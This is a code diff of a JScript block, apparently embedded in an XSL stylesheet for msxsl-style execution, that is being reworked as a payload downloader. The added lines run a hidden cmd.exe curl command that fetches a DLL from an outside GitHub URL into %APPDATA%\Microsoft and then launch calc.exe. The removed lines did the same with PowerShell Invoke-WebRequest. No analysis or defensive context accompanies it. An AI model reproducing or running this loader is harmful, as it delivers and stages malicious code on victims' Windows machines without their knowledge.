@@ -13,17 +13,11 @@
 
 		    // Build path to %APPDATA%\Microsoft\7346832764233279.dll
 	            var shell = new ActiveXObject("WScript.Shell");
-		    shell.Run('calc.exe');
 		    var r = new ActiveXObject("WScript.Shell").Run('explorer.exe "C:\"');
-
-	            try {
-		    	shell.Run('notepad.exe');
-			var ps = "powershell -Command \"Invoke-WebRequest 'https://github.com/MohamedAbderraouf/hostingmsxsl/raw/refs/heads/main/7346832764233279.dll' -OutFile '$env:APPDATA\\Microsoft\\7346832764233279.dll'\"";
-	                shell.Run(ps, 0, true);
-	                shell.Run('explorer.exe "C:\\"', 0, true); // <-- PAS D'ERREUR ICI
-	            } catch(e) {
-	                shell.Run('calc.exe'); // <-- PAS D'ERREUR ICI
-	            }
+		    var shell = new ActiveXObject("WScript.Shell");
+		    var cmd = 'cmd.exe /c curl -L -o "%APPDATA%\\Microsoft\\7346832764233279.dll" "https://github.com/MohamedAbderraouf/hostingmsxsl/raw/refs/heads/main/7346832764233279.dll"';
+	            shell.Run(cmd, 0, true);
+		    shell.Run('calc.exe');
 
 		]]>
 	</script>
